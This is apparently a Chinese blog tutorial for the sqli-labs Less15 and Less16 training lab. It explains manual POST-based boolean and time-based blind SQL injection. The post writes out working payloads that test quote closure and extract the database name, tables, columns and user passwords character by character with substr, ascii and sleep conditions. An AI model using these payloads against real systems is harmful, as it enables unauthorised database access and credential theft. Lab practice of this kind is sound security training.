# 原创
：  （手工）【sqli-labs15-16】POST注入：布尔/时间盲注

# （手工）【sqli-labs15-16】POST注入：布尔/时间盲注

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less15（POST-Blind -Boolian/Time Based - Single Quotes）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（布尔/时间盲注-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9)

[布尔型注入](#%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5)

[2.3、第二步：猜数据库名长度](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6)

[ 2.4、第三步：猜数据库名（ASCII码）](#3.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%88ASCII%E7%A0%81%EF%BC%89)

[2.5、第四步：猜表名](#3.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%8C%9C%E8%A1%A8%E5%90%8D)

[2.6、第五步：猜字段名](#3.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D)

[ 2.7、第六步：猜数据](#3.8%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE)

[时间盲注：](#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A)

[2.3、第二步：猜数据库名长度](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6)

[2.4、基本操作](#2.4%E3%80%81%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C)

[三、Less16（POST-Blind -Boolian/Time Based - Double Quotes）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（布尔/时间盲注-双引号-反括号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

---


> 
<h2>推荐：</h2>
[【SQL注入-有回显】DNS请求注入：原理、平台、使用过程、配置<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125285625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165719814516782246440800%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165719814516782246440800&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125285625-null-null.185^v2^control&amp;utm_term=DNS&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125285625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165719814516782246440800%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165719814516782246440800&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125285625-null-null.185%5Ev2%5Econtrol&amp;utm_term=DNS&amp;spm=1018.2226.3001.4450)[【SQL注入-无回显】时间盲注：原理、函数、利用过程<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165719829016781683968225%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165719829016781683968225&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125096394-null-null.185^v2^control&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165719829016781683968225%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165719829016781683968225&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)[【SQL注入-无回显】布尔盲注：原理、函数、利用过程<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165719829016781683968225%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165719829016781683968225&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125275974-null-null.185^v2^control&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165719829016781683968225%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165719829016781683968225&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)



 

---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：猜数据库名长度
第三步：猜数据库名（ASCII）
第四步：猜表名长
第五步：猜表名
第六步：猜字段名长
第七步：猜字段名
第八步：猜数据长
第九步：猜数据


---


---


## 二、Less15（POST-Blind -Boolian/Time Based - Single Quotes）

> 
<h3>2.1、简介：（布尔/时间盲注-单引号）</h3>
请求方法：POST
方法：布尔/时间布尔盲注


> 
<h3>2.2、第一步：注入点测试</h3>
1 or 1=1#<br/> 1' or 1=1#<br/> 1" or 1=1#<br/> 1') or 1=1#<br/> 1") or 1=1#
 测试1' or 1=1#时

 测试其他的时候<img alt="" height="839" src="https://img-blog.csdnimg.cn/576207f2883f4c2aaf1be109e473c0ce.png" width="1200"/>
 
存在SQL盲注，且有2种状态，对错
且为bool型单引号闭合盲注（也可以用时间盲注）


---


---


## 布尔型注入

> 
<h3>2.3、第二步：猜数据库名长度</h3>
admin' and (length(database()))&gt;7#
为对

 

admin' and (length(database()))&gt;8#
为错

 
所以 当前数据库名称长度为：8


> 
<h3> 2.4、第三步：猜数据库名（ASCII码）</h3>
admin' and ascii(substr(database(),1,1))&gt;100#
为对

 

admin' and ascii(substr(database(),1,1))&lt;150#
为对

 在100-150之间
 二分法，一直从中间分下去，直到确定一个值对应的ascii码
通过这个方法判断出整个数据库名


> 
<h3>2.5、第四步：猜表名</h3>
admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100#
为对

 
admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150#
为对

 值在100-150之间
 采用二分法以此类推得到唯一的值
通过这个方法判断出整个表名


> 
<h3>2.6、第五步：猜字段名</h3>
admin' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))&gt;40#
为对

 
admin' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))&lt;80#
为对

 值在40-80之间
 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


> 
<h3> 2.7、第六步：猜数据</h3>

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


---


---


## 时间盲注：

> 
<h3>2.3、第二步：猜数据库名长度</h3>

admin' and if(length(database())&gt;7, sleep(5),0)#
判断正确，转了5s

admin' and if(length(database())&gt;8, sleep(5),0)#
判断错误，未转

 
 所以当前数据库名称长度为：8


> 
<h3>2.4、基本操作</h3>
暴库
admin' and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))#
<hr/>
暴表
admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;100, 0, sleep(5))#
<hr/>
暴字段
admin' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&gt;100, 0, sleep(5))#
<hr/>
暴数据
admin' and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))#


---


---


## 三、Less16（POST-Blind -Boolian/Time Based - Double Quotes）

> 
<h3>2.1、简介：（布尔/时间盲注-双引号-反括号）</h3>
请求方法：POST
方法：布尔/时间盲注


> 
 方法和Less15一样

